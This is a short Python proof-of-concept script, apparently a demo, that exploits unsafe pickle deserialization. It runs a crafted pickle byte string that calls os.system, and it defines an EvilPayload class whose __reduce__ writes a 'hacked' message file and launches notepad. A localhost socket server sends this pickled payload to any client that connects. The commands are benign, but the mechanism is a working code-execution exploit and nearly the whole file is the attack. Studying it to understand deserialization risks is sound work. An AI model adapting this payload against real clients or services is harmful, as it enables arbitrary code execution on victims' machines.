import pickle

pickle.loads(b"cos\nsystem\n(S'echo I am Evil Pickle-module!'\ntR.")

import subprocess
import socket


class EvilPayload:

    def __reduce__(self):
        import os
        os.system("echo You've been hacked by Evil Pickle!!! > evil_msg.txt")

        return (subprocess.Popen, (('notepad', 'evil_msg.txt'),))


def evil_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("localhost", 9999))
    print('Evil server run...')
    sock.listen()
    conn, addr = sock.accept()
    print('We get a client', addr)

    print('Send him "payload"...')
    conn.send(pickle.dumps(EvilPayload()))


evil_server()
